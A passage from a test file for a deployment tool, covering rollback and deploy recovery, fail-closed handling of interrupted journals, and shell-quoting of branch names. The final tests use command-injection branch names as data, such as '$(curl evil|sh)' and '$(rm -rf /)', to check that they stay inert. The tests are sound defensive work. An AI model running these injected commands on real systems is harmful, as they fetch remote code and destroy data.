    const recoveryFlipIdx = calls.findIndex((cmd) => cmd.includes(`ln -s ${cfg.currentLink} `));
    expect(recoveryFlipIdx).toBeGreaterThan(forwardFlipIdx); // the recovery flip landed LAST
    // The running process actually matches the restored symlink: pm2 WAS
    // restarted (by the recovery) after the flip-back, not just the pointer
    // moved — the check fails BEFORE the forward restart ever runs, so the
    // only `pm2 startOrRestart` seen is the recovery's resume of the ORIGINAL
    // release (same shape as the sibling forward-deploy recovery test above).
    expect(calls.filter((cmd) => cmd.includes('pm2 startOrRestart')).length).toBe(1);
    // No flip happened after the recovery one — the symlink is left settled.
    expect(calls.filter((cmd) => cmd.includes('ln -s')).length).toBe(2);
  });

  it('recovery also holds when the restore itself is imperfect — the failure is surfaced, not swallowed', () => {
    // The preRestartCheck fails (triggers recovery); the recovery's OWN
    // verification of the restored originalCurrent ALSO fails (health never
    // returns 200) — an imperfect restore. This must escalate loudly, not
    // silently report success or swallow the original cause.
    const { runtime } = makeReleaseRuntime({ fail: ['check-port', 'curl'] });
    const rbCfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });
    expect(() => release.rollbackRelease(rbCfg, {}, ctx(runtime)))
      .toThrow(/MANUAL RECOVERY REQUIRED/);
  });

  // PKG-135 Finding B: `activateSymlink(..., { tolerate: true })` neither
  // throws nor reports success/failure on its own -- a blind restart right
  // after it would restart PM2 against WHATEVER `current` still points at,
  // which may still be the rollback target that just failed its check. That
  // is worse than doing nothing. When the recovery's OWN symlink swap fails,
  // PM2 must NOT be touched at all.
  it('when the recovery symlink swap itself fails, PM2 is NOT restarted (never risks activating the failed rollback target)', () => {
    const probe = makeReleaseRuntime();
    const { runtime, calls } = makeReleaseRuntime({ fail: ['check-port', `ln -s ${probe.cfg.currentLink} `] });
    const rbCfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });

    expect(() => release.rollbackRelease(rbCfg, {}, ctx(runtime)))
      .toThrow(/MANUAL RECOVERY REQUIRED/);

    // The forward flip (to previous) succeeded; only the RECOVERY flip-back
    // (to originalCurrent / cfg.currentLink) failed. Confirm both actually
    // ran, so this test isn't vacuously passing because neither did.
    expect(calls.some((cmd) => cmd.includes(`ln -s ${probe.cfg.previousLink} `))).toBe(true);
    expect(calls.some((cmd) => cmd.includes(`ln -s ${probe.cfg.currentLink} `))).toBe(true);
    // PM2 must never have been restarted -- neither the forward restart
    // (never reached; the check fails first) nor a recovery restart onto a
    // `current` that may still point at the failed rollback target.
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(false);
  });

  it('an unhealthy rollback target (no preRestartChecks involved) still recovers via the same shared path', () => {
    // Regression guard for the refactor that extracted `recoverFailedRollback`
    // out of this pre-existing branch — same behavior, now shared code.
    let verifyCwdCalls = 0;
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes('readlink -f /proc/')) {
          verifyCwdCalls += 1;
          return verifyCwdCalls <= 1 ? '/srv/app/releases/99999999cccc-20260101T000000Z' : rt.cfg.canonical;
        }
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    expect(() => release.rollbackRelease(relConfig(), {}, ctx(runtime))).toThrow(/restored the original release/);
  });
});

describe('release deploy — failure recovery by phase', () => {
  it('install failure: current keeps serving, apps never stopped, candidate quarantined', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['npm ci'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/npm ci/);
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => /mv -Tf .*\/current/.test(cmd))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('worktree remove --force'))).toBe(true);
  });

  it('build failure: quarantines candidate, never stops apps or flips', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['npm run build'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow();
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('worktree remove --force'))).toBe(true);
  });

  it('release-check failure: candidate quarantined before the disruptive window', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['check-prisma'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow();
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => /mv -Tf .*\/current/.test(cmd))).toBe(false);
  });

  it('backup failure (writers stopped, nothing migrated): resumes previous, no DB restore', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['run-backup'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/backup failed/);
    expect(calls.some((cmd) => cmd.includes('run-migrate'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(false);
    // previous release brought back via the stable ecosystem.
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(true);
  });

  it('migration failure: restores the DB backup and resumes the previous release', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['run-migrate'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow();
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(true);
    expect(calls.some((cmd) => cmd.includes("export DEPLOY_KIT_BACKUP_ID='/var/lib/smarthome/backups/smarthome-20260710T090000Z.db.gpg';"))).toBe(true);
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(true);
  });

  // Same behavioural guard as DEPLOY_KIT_SHARED_DIR above: real restore hooks
  // observed in consumer configs are all simple single commands today (e.g.
  // `bash scripts/restore-db.sh --deploy-hook`), so the bare-assignment bug
  // does not currently bite in practice -- but the `export …; ` form costs
  // nothing and closes the same latent hole if a hook ever becomes compound.
  // This proves it survives a compound restore hook end-to-end through a real
  // shell, not just via a string match on the emitted command.
  it('DEPLOY_KIT_BACKUP_ID reaches a child process at the end of a real compound restore hook chain', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['run-migrate'] });
    const cfg = relConfig({
      hooks: {
        install: 'npm ci', build: 'npm run build', migrate: 'run-migrate', backup: 'run-backup',
        // Leads with `cd` (a regular, non-special builtin) -- see the
        // DEPLOY_KIT_SHARED_DIR behavioural test above for why that matters:
        // a `set -a`-first chain would pass even on the broken bare-assignment
        // code, since `set` is a POSIX special builtin.
        restore: `cd ${process.cwd()} && node -e "process.stdout.write(process.env.DEPLOY_KIT_BACKUP_ID || 'MISSING')"`,
      },
    });
    expect(() => release.deployRelease(cfg, {}, ctx(runtime))).toThrow();
    const emitted = calls.find((cmd) => cmd.includes('DEPLOY_KIT_BACKUP_ID') && cmd.includes('process.env'));
    expect(emitted).toBeDefined();
    const shellCommand = (emitted as string).replace('cd /srv/app', `cd ${process.cwd()}`);
    const output = execSync(shellCommand, { shell: '/bin/sh', encoding: 'utf8' });
    expect(output).toBe('/var/lib/smarthome/backups/smarthome-20260710T090000Z.db.gpg');
  });

  it('activation verify failure (SHA mismatch): flips back, restores DB, resumes previous', () => {
    const { runtime, calls } = makeReleaseRuntime({ runningSha: 'deadbeefdeadbeef' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/verification failed/);
    // flip back onto current happened (there are two mv -Tf onto current: forward + back)
    expect(calls.filter((cmd) => /mv -Tf .*\/current/.test(cmd)).length).toBeGreaterThanOrEqual(2);
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(true);
  });

  // PKG-135 Finding B's twin (deployRelease's OWN recover(), 'migrated'/
  // 'flipped'/'verify' phase — same bug as rollbackRelease's
  // recoverFailedRollback, just never fixed there the first time around).
  // This is the SUCCESSFUL-flip-back case, pinned explicitly as the no-
  // regression guard for that fix: the writers-stopped -> flip-back ->
  // DB-restore -> resume ORDER (the Codex #1 comment's sequencing) must be
  // completely unchanged.
  it('successful flip-back during recovery: writers-stopped -> flip-back -> DB-restore -> resume order is unchanged', () => {
    const { runtime, calls, cfg } = makeReleaseRuntime({ runningSha: 'deadbeefdeadbeef' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/verification failed/);

    const indicesOf = (needle: string) => calls.reduce<number[]>((acc, cmd, i) => {
      if (cmd.includes(needle)) acc.push(i);
      return acc;
    }, []);
    // `pm2 stop` and `pm2 startOrRestart` each appear TWICE: once in the
    // normal forward flow (pre-migration pause; restarting onto the
    // candidate, before verification ever runs) and once again inside
    // recovery (stopWritersConfirmed()'s own re-check; the resume of the
    // PREVIOUS release). We want recovery's OWN occurrences — the LAST of
    // each — not whichever comes first.
    const stopIdxs = indicesOf('pm2 stop');
    const resumeIdxs = indicesOf('pm2 startOrRestart');
    // The recovery flip-back's exact command: source = st.prevTarget
    // (cfg.currentLink — what WAS current before this deploy), destination =
    // `current` (tmp file ends in ".current"). Distinct from the FORWARD
    // path's own two symlink writes: flipping `current` to the NEW candidate
    // (different source) and updating the `previous` pointer to the old
    // current (same source, but destination "previous", tmp ends in
    // ".previous") — neither of those is this line.
    const flipBackIdx = calls.findIndex((cmd) => cmd.includes(`ln -s ${cfg.currentLink} /srv/app/.dk-swap.$$.current`));
    const restoreIdx = calls.findIndex((cmd) => cmd.includes('run-restore'));

    const recoveryStopIdx = stopIdxs[stopIdxs.length - 1];
    const recoveryResumeIdx = resumeIdxs[resumeIdxs.length - 1];
    expect(stopIdxs.length).toBe(2);
    expect(resumeIdxs.length).toBe(2);
    expect(flipBackIdx).toBeGreaterThanOrEqual(0);
    expect(recoveryStopIdx).toBeLessThan(flipBackIdx);
    expect(flipBackIdx).toBeLessThan(restoreIdx);
    expect(restoreIdx).toBeLessThan(recoveryResumeIdx);
  });

  // PKG-135 Finding B's twin, the actual fix: `activateSymlink(...,
  // { tolerate: true })` neither throws nor reports success on its own — the
  // ORIGINAL code threw the return value away here too and unconditionally
  // resumed the previous release next. If the flip-back itself fails,
  // `current` may still point at the failed CANDIDATE, and restarting PM2
  // would risk activating exactly that — worse than doing nothing. This
  // matters MORE here than in rollbackRelease: it fires when a deploy has
  // already failed mid-flight with a possibly-migrated database.
  it('a FAILING symlink flip-back during recovery does NOT resume the previous release, and surfaces MANUAL RECOVERY REQUIRED naming the still-active candidate', () => {
    const probe = makeReleaseRuntime();
    // Fails ONLY the recovery's flip-back (source = st.prevTarget /
    // cfg.currentLink, destination = `current`) — NOT the forward path's
    // OWN two symlink writes, which share the same source (updating the
    // `previous` pointer, destination "previous") or destination (flipping
    // `current` to the NEW candidate, different source) but never both.
    const { runtime, calls } = makeReleaseRuntime({
      runningSha: 'deadbeefdeadbeef', // forces the forward activation verify to fail -> triggers recover()
      fail: [`ln -s ${probe.cfg.currentLink} /srv/app/.dk-swap.$$.current`],
    });

    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime)))
      .toThrow(/MANUAL RECOVERY REQUIRED/);

    // The recovery flip-back was actually attempted (and failed) — this
    // isn't vacuously passing because it never ran.
    expect(calls.some((cmd) => cmd.includes(`ln -s ${probe.cfg.currentLink} /srv/app/.dk-swap.$$.current`))).toBe(true);
    // DB-restore decision, pinned: writers were already confirmed stopped
    // before the flip-back was ever attempted, so the restore is still safe
    // and STILL runs even though the flip-back failed — leaving a migrated
    // DB paired with code that may revert to pre-migration is its own hazard,
    // and this is a data operation, not a traffic-affecting one.
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(true);
    // What must NOT happen: a SECOND `pm2 startOrRestart` -- the recovery's
    // own resume of the previous release. The FIRST one is the forward
    // path's own restart onto the candidate (before verification ever runs,
    // which is what triggers recovery in the first place) and legitimately
    // still happens; only the recovery-triggered one must be suppressed.
    expect(calls.filter((cmd) => cmd.includes('pm2 startOrRestart')).length).toBe(1);
  });

  it('escalates to MANUAL RECOVERY REQUIRED when a migration failed AND the restore also fails', () => {
    const { runtime } = makeReleaseRuntime({ fail: ['run-migrate', 'run-restore'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/MANUAL RECOVERY REQUIRED/);
  });

  it('preflight refuses a migrate hook with no backup or no restore hook', () => {
    const noBackup = relConfig({ hooks: { install: 'npm ci', build: 'npm run build', migrate: 'run-migrate', backup: null, restore: 'run-restore' } });
    expect(() => release.deployRelease(noBackup, {}, ctx(makeReleaseRuntime().runtime))).toThrow(/requires a .backup. hook/);
    const noRestore = relConfig({ hooks: { install: 'npm ci', build: 'npm run build', migrate: 'run-migrate', backup: 'run-backup', restore: null } });
    expect(() => release.deployRelease(noRestore, {}, ctx(makeReleaseRuntime().runtime))).toThrow(/requires a .restore. hook/);
  });
});

describe('release deploy — safety hardening (Codex review fixes)', () => {
  it('aborts if DB writers cannot be CONFIRMED stopped (never backs up over live writers)', () => {
    const { runtime, calls } = makeReleaseRuntime({ stopIneffective: true });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/could not confirm|Could not confirm/i);
    expect(calls.some((cmd) => cmd.includes('run-backup'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('run-migrate'))).toBe(false);
  });

  it('durably journals state (atomic write) before the atomic flip', () => {
    const rt = makeReleaseRuntime();
    release.deployRelease(relConfig(), {}, ctx(rt.runtime));
    const c = rt.calls;
    const firstStateWrite = c.findIndex((cmd) => /deploy-kit-state\.json\.tmp.*&& mv -f/.test(cmd));
    const flip = c.findIndex((cmd) => /mv -Tf .*\/current/.test(cmd));
    expect(firstStateWrite).toBeGreaterThanOrEqual(0);
    expect(firstStateWrite).toBeLessThan(flip);
  });

  it('rollback flips back to the original release when the target is unhealthy', () => {
    let verifyCwdCalls = 0;
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        // First activation-verify (the rollback target) sees a stale cwd → unhealthy;
        // the flip-back verify (original) sees a good cwd → healthy.
        if (cmd.includes('readlink -f /proc/')) {
          verifyCwdCalls += 1;
          return verifyCwdCalls <= 1 ? '/srv/app/releases/99999999cccc-20260101T000000Z' : rt.cfg.canonical;
        }
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    expect(() => release.rollbackRelease(relConfig(), {}, ctx(runtime))).toThrow(/restored the original release/);
  });

  it('resumes the previous release after an interruption in the stopped phase', () => {
    const previous = 'releases/00000000aaaa-20260709T090000Z';
    const { runtime, calls } = makeReleaseRuntime({
      canonical: `/srv/app/${previous}`,
      currentLink: previous,
      stateContent: JSON.stringify({
        phase: 'stopped',
        releaseId: 'a1b2c3d4e5f6-20260710T010000Z',
        prevTarget: previous,
        migrated: false,
      }),
      fail: ['stop-after-recovery'],
    });
    const config = relConfig({
      preDeployChecks: [{ name: 'stop-after-recovery', command: 'stop-after-recovery' }],
    });

    expect(() => release.deployRelease(config, {}, ctx(runtime))).toThrow(/Pre-deploy check failed/);
    const resume = calls.findIndex((cmd) => cmd.includes('pm2 startOrRestart'));
    const nextDeploy = calls.findIndex((cmd) => cmd.includes('stop-after-recovery'));
    expect(resume).toBeGreaterThanOrEqual(0);
    expect(resume).toBeLessThan(nextDeploy);
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('"phase":"recovered"'))).toBe(true);
  });

  // A stale migrated/flipped journal must fail closed before ANY new deploy work
  // begins, not just before the disruptive DB/symlink/PM2 ops above -- otherwise
  // a "no mutation" assertion could pass while the pipeline had already fetched
  // and materialized a new candidate release. `preDeployChecks` runs early
  // (right after the interrupted-recovery gate); configuring a named sentinel
  // there and asserting it never ran proves the pipeline never got past the
  // fail-closed throw, alongside the fetch/materialize commands it would reach next.
  const NEW_WORK_SENTINEL = { name: 'no-new-deploy-work', command: 'no-new-deploy-work' };
  const assertNoNewDeployWorkStarted = (calls: string[]) => {
    expect(calls.some((cmd) => cmd.includes('no-new-deploy-work'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('fetch --prune'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('worktree add --detach'))).toBe(false);
  };

  // A "migrated" journal means a backup was taken and writers were stopped for
  // the migration, though they may since have been resumed externally after the
  // interruption. deploy-kit cannot prove no writes have landed since that backup — a service
  // manager (e.g. PM2 resurrect replaying a previously saved dump) or an operator
  // may have already brought the old app back online. So this phase fails closed
  // on the NEXT deploy rather than auto-restoring: no backup restore, no symlink
  // rewrite, no PM2 stop/restart, no new release work.
  it('fails closed on an interrupted migrated phase (no auto-restore, no mutation)', () => {
    const previous = 'releases/00000000aaaa-20260709T090000Z';
    const backupId = '/var/lib/app/backups/pre-migration.db.gpg';
    const { runtime, calls } = makeReleaseRuntime({
      canonical: `/srv/app/${previous}`,
      currentLink: previous,
      stateContent: JSON.stringify({
        phase: 'migrated',
        releaseId: 'a1b2c3d4e5f6-20260710T010000Z',
        prevTarget: previous,
        backupId,
        migrated: true,
      }),
    });
    const config = relConfig({ preDeployChecks: [NEW_WORK_SENTINEL] });

    expect(() => release.deployRelease(config, {}, ctx(runtime)))
      .toThrow(/MANUAL RECOVERY REQUIRED.*cannot prove no writes occurred after the pre-migration backup/s);
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('ln -s'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('mv -Tf'))).toBe(false);
    assertNoNewDeployWorkStarted(calls);
  });

  it('fails closed on an interrupted flipped phase where the flip already landed (no auto-restore, no mutation)', () => {
    const previous = 'releases/00000000aaaa-20260709T090000Z';
    const releaseId = 'a1b2c3d4e5f6-20260710T010000Z';
    const backupId = '/var/lib/app/backups/pre-migration.db.gpg';
    const { runtime, calls } = makeReleaseRuntime({
      canonical: `/srv/app/releases/${releaseId}`,
      currentLink: `releases/${releaseId}`,
      stateContent: JSON.stringify({
        phase: 'flipped',
        releaseId,
        prevTarget: previous,
        backupId,
        migrated: true,
        flipped: true,
      }),
    });
    const config = relConfig({ preDeployChecks: [NEW_WORK_SENTINEL] });

    expect(() => release.deployRelease(config, {}, ctx(runtime)))
      .toThrow(/MANUAL RECOVERY REQUIRED.*cannot prove no writes occurred after the pre-migration backup/s);
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('ln -s'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('mv -Tf'))).toBe(false);
    assertNoNewDeployWorkStarted(calls);
  });

  // A code-only "flipped" journal (no migrate hook, migrated:false) has no
  // pre-migration backup and no post-backup writes to worry about. It still
  // fails closed per the all-flipped policy above, but for a different reason:
  // deploy-kit cannot trust the on-disk `current`/`previous` pointers against
  // whatever process is actually running without re-deriving that state by hand.
  it('fails closed on an interrupted flipped phase with no DB backup (code-only deploy)', () => {
    const previous = 'releases/00000000aaaa-20260709T090000Z';
    const releaseId = 'a1b2c3d4e5f6-20260710T010000Z';
    const { runtime, calls } = makeReleaseRuntime({
      canonical: `/srv/app/releases/${releaseId}`,
      currentLink: `releases/${releaseId}`,
      stateContent: JSON.stringify({
        phase: 'flipped',
        releaseId,
        prevTarget: previous,
        migrated: false,
      }),
    });
    const config = relConfig({ preDeployChecks: [NEW_WORK_SENTINEL] });

    expect(() => release.deployRelease(config, {}, ctx(runtime)))
      .toThrow(/MANUAL RECOVERY REQUIRED/);
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('ln -s'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('mv -Tf'))).toBe(false);
    assertNoNewDeployWorkStarted(calls);
  });

  // The atomic `mv -Tf` swap never landed (the process died before or during it),
  // so `current` still reads as the previous release even though the journal says
  // "flipped". deploy-kit must not treat that as evidence the flip is safely
  // undone — the journal is migrated:true, so it still cannot prove no writes have
  // landed since the pre-migration backup (a service manager or operator may have
  // brought the old app back online), so this still fails closed rather than being
  // special-cased as "effectively stopped".
  it('fails closed on the atomic-flip-not-landed case: phase flipped but live current still equals previous', () => {
    const previous = 'releases/00000000aaaa-20260709T090000Z';
    const releaseId = 'a1b2c3d4e5f6-20260710T010000Z';
    const backupId = '/var/lib/app/backups/pre-migration.db.gpg';
    const { runtime, calls } = makeReleaseRuntime({
      canonical: `/srv/app/${previous}`,
      currentLink: previous,
      stateContent: JSON.stringify({
        phase: 'flipped',
        releaseId,
        prevTarget: previous,
        backupId,
        migrated: true,
        flipped: false,
      }),
    });
    const config = relConfig({ preDeployChecks: [NEW_WORK_SENTINEL] });

    expect(() => release.deployRelease(config, {}, ctx(runtime)))
      .toThrow(/MANUAL RECOVERY REQUIRED.*cannot prove no writes occurred after the pre-migration backup/s);
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('ln -s'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('mv -Tf'))).toBe(false);
    assertNoNewDeployWorkStarted(calls);
  });

  // A "stopped" journal implies current was never touched. If the live pointer is
  // neither the recorded previous nor the candidate release, the on-host state
  // disagrees with the journal in a way deploy-kit cannot reconcile automatically.
  it('fails closed on an impossible pointer: stopped journal but current matches neither previous nor candidate', () => {
    const previous = 'releases/00000000aaaa-20260709T090000Z';
    const releaseId = 'a1b2c3d4e5f6-20260710T010000Z';
    const { runtime, calls } = makeReleaseRuntime({
      currentLink: 'releases/00000000cccc-20260708T090000Z', // neither previous nor the candidate
      stateContent: JSON.stringify({
        phase: 'stopped',
        releaseId,
        prevTarget: previous,
        migrated: false,
      }),
    });

    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/MANUAL RECOVERY REQUIRED/);
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('ln -s'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('mv -Tf'))).toBe(false);
  });

  it('rejects a corrupt current pointer that tries to traverse out of releases/', () => {
    const { runtime } = makeReleaseRuntime({ currentLink: 'releases/..' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/not a safe releases\/<id> target/);
  });

  it('prune removes the oldest release beyond keepReleases, protecting current/previous', () => {
    const rt = makeReleaseRuntime({
      releasesList: '00000000aaaa-20260709T090000Z\n00000000bbbb-20260708T090000Z\n00000000cccc-20260707T090000Z\nnot-a-release-dir',
      currentLink: 'releases/00000000aaaa-20260709T090000Z',
      previousLink: 'releases/00000000bbbb-20260708T090000Z',
    });
    const cfg = relConfig({ layout: { type: 'releases', keepReleases: 2, sharedPaths: ['.env'], releaseChecks: [], runningShaCommand: 'get-running-sha' } });
    const noop = () => {};
    const pruneCtx = { runtime: rt.runtime, sleep: noop, log: { step: noop, warning: noop, success: noop, info: noop, error: noop, header: noop, divider: noop } };
    release.prune(cfg, release.releasePaths(cfg), '00000000aaaa-20260709T090000Z', pruneCtx);
    // oldest recognized (cccc) is removed; the unrecognized dir is left alone.
    expect(rt.calls.some((cmd) => cmd.includes('worktree remove --force /srv/app/releases/00000000cccc-20260707T090000Z'))).toBe(true);
    expect(rt.calls.some((cmd) => cmd.includes('not-a-release-dir'))).toBe(false);
    expect(rt.calls.some((cmd) => cmd.includes('worktree remove --force /srv/app/releases/00000000bbbb'))).toBe(false);
  });
});

describe('release deploy — flag honoring vs rejection under the release layout', () => {
  it('honors --skip-deps: no install command runs and "install" is absent from steps', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const result = release.deployRelease(relConfig(), { skipDeps: true }, ctx(runtime));
    expect(calls.some((cmd) => cmd.includes('npm ci'))).toBe(false);
    expect(result.steps).not.toContain('install');
    // the build step is unaffected by --skip-deps.
    expect(result.steps).toContain('build');
  });

  it('honors --skip-build: no build command runs and "build" is absent from steps', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const result = release.deployRelease(relConfig(), { skipBuild: true }, ctx(runtime));
    expect(calls.some((cmd) => cmd.includes('npm run build'))).toBe(false);
    expect(result.steps).not.toContain('build');
    // install is unaffected by --skip-build.
    expect(result.steps).toContain('install');
  });

  it('rejects --no-stash with a clear error naming the flag (no working-tree stash under this layout)', () => {
    const { runtime, calls } = makeReleaseRuntime();
    expect(() => release.deployRelease(relConfig(), { stash: false }, ctx(runtime))).toThrow(/--no-stash does not apply/);
    // nothing was touched — the rejection happens before any target command runs.
    expect(calls.length).toBe(0);
  });

  it('rejects --skip-build for release-layout rollback (no rebuild step exists there)', () => {
    const { runtime, calls } = makeReleaseRuntime();
    expect(() => release.rollbackRelease(relConfig(), { skipBuild: true }, ctx(runtime))).toThrow(/--skip-build does not apply/);
    expect(calls.length).toBe(0);
  });

  it('rejects --skip-deps for release-layout rollback (no install step exists there)', () => {
    const { runtime, calls } = makeReleaseRuntime();
    expect(() => release.rollbackRelease(relConfig(), { skipDeps: true }, ctx(runtime))).toThrow(/--skip-deps does not apply/);
    expect(calls.length).toBe(0);
  });
});

describe('release deploy — default-branch resolution (Bug 2)', () => {
  it('with branch: null, resolves origin/HEAD instead of hardcoding master (repo whose default is main)', () => {
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        // The shared resolveBranch call, scoped to the bare mirror via --git-dir.
        if (cmd.includes("rev-parse --abbrev-ref 'origin'/HEAD")) return 'origin/main';
        // The subsequent SHA resolution now looks up refs/heads/main, not master.
        if (cmd.includes("rev-parse refs/heads/'main'")) return SHA;
        if (cmd.includes("rev-parse refs/heads/'master'")) throw new Error('should not resolve refs/heads/master when the default branch is main');
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const result = release.deployRelease(relConfig({ branch: null }), {}, ctx(runtime));
    expect(result.branch).toBe('main');
    expect(result.sha).toBe(SHA);
    expect(result.steps).toContain('flip');
  });

  it('with branch: null and no resolvable origin/HEAD, falls back to master', () => {
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes("rev-parse --abbrev-ref 'origin'/HEAD")) return ''; // unresolvable
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const result = release.deployRelease(relConfig({ branch: null }), {}, ctx(runtime));
    expect(result.branch).toBe('master');
  });
});

describe('PKG-82 Bug 6: release layout quotes branch/remote at the git call site (defense in depth)', () => {
  it('quotes a branch resolved from a hostile origin/HEAD (;, backticks, $(...)) so it cannot break out', () => {
    // The target's own `origin/HEAD` is attacker-influenceable (whoever can rename
    // the repo's default branch controls it) and git's check-ref-format permits
    // `;`, backticks, `$()` in a refname. resolveBranch (src/branch.js) resolves
    // this, and deployRelease interpolates it into `git rev-parse refs/heads/<branch>`
    // on the target — assert the emitted command shell-quotes it rather than
    // executing the injected command.
    const evilBranch = 'master; `curl evil|sh` $(rm -rf /)';
    const rt = makeReleaseRuntime();
    const calls: string[] = [];
    const runtime = {
      execFileSync: (f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        calls.push(cmd);
        // The shared resolveBranch call, scoped to the bare mirror via --git-dir.
        if (cmd.includes("rev-parse --abbrev-ref 'origin'/HEAD")) return `origin/${evilBranch}`;
        return (rt.runtime.execFileSync as any)(f, args);
      },
    };
    const result = release.deployRelease(relConfig({ branch: null }), {}, ctx(runtime));
    expect(result.branch).toBe(evilBranch);
    const joined = calls.join('\n');
    expect(joined).toContain(`rev-parse refs/heads/'${evilBranch}'`);
    // never present unquoted in a way that would let the shell run it.
    expect(joined).not.toContain(`rev-parse refs/heads/${evilBranch}`);
  });

  it('quotes a `$()` command-substitution branch name as an inert literal in the fallback origin/<branch> lookup', () => {
    // Force the primary `refs/heads/<branch>` lookup to fail (an invalid/non-hex
    // result) so deployRelease falls back to resolveSha(`${remote}/${branch}`) —
    // the second unquoted interpolation the ticket calls out.
    const evilBranch = '$(curl evil|sh)';
    const rt = makeReleaseRuntime();
    const calls: string[] = [];
    const runtime = {
      execFileSync: (f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        calls.push(cmd);
        if (cmd.includes(`rev-parse refs/heads/'${evilBranch}'`)) return 'not-a-sha'; // fails the 40-hex check
        if (cmd.includes(`rev-parse 'origin'/'${evilBranch}'`)) return SHA;
        return (rt.runtime.execFileSync as any)(f, args);
      },
    };
    const result = release.deployRelease(relConfig({ branch: evilBranch }), {}, ctx(runtime));
    expect(result.sha).toBe(SHA);
    const joined = calls.join('\n');
    expect(joined).toContain(`rev-parse 'origin'/'${evilBranch}'`);
    expect(joined).not.toContain(`rev-parse origin/${evilBranch}`);
  });

  it('escapes an embedded single quote in the branch so it cannot break out of the quoting', () => {
    const evilBranch = "master'; curl evil|sh #";
    const rt = makeReleaseRuntime();
    const calls: string[] = [];
    const runtime = {
      execFileSync: (f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        calls.push(cmd);
        return (rt.runtime.execFileSync as any)(f, args);
      },
    };
    release.deployRelease(relConfig({ branch: evilBranch }), {}, ctx(runtime));
    const joined = calls.join('\n');
